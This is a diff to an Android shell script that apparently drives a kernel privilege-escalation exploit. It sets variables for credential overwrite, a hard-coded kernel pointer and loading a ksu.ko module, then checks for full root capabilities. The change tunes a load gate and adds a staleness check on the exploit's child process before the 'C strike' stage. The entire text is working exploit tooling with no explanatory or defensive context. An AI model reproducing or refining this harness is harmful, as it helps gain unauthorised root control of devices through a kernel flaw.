@@ -4,7 +4,7 @@ OUTD=/data/local/tmp
 LOG=$OUTD/cstrike_log.txt
 LOAD=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null || echo 0)
 LOAD_INT=${LOAD%.*}
-if [ "${LOAD_INT:-99}" -gt 20 ]; then echo "load gate refuse: $LOAD"; exit 2; fi
+if [ "${LOAD_INT:-99}" -gt 15 ]; then echo "load gate refuse: $LOAD"; exit 2; fi
 echo "=== cstrike start $(date +%H:%M:%S) preload=$(sha256sum $OUTD/preload.so | cut -d' ' -f1)" > $LOG
 rm -f $OUTD/mt49_child_status.txt $OUTD/root_alive.txt $OUTD/R.out $OUTD/C2.out
 am kill-all 2>/dev/null
@@ -30,13 +30,20 @@ else
 fi
 sleep 30
 
+# mt86: child 心跳新鲜度校验 — stale 文件同样含 CapEff=full, 不可盲信
+NOW=$(date +%s); MT=$(stat -c %Y $OUTD/mt49_child_status.txt 2>/dev/null || echo 0)
+AGE=$((NOW-MT))
+if [ $AGE -gt 15 ]; then
+  echo "C ABORT: child heartbeat stale ${AGE}s (child dead?) — 不击" >> $LOG
+  echo "=== end $(date +%H:%M:%S)" >> $LOG; cat $LOG; exit 0
+fi
 echo "--- C strike (LAST touch of this child) ---" >> $LOG
 timeout 250 env \
   PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
   PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C \
   PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 \
   PSELECT_TASK=$TASK PSELECT_CONSUMER_CPU=6 \
-  PSELECT_KO=/data/local/tmp/ksu.ko PSELECT_CHILD_POLLS=6000 \
+  PSELECT_KO=/data/local/tmp/ksu.ko \
   PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 \
   PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 \
   PSELECT_NO_CANARY=1 \
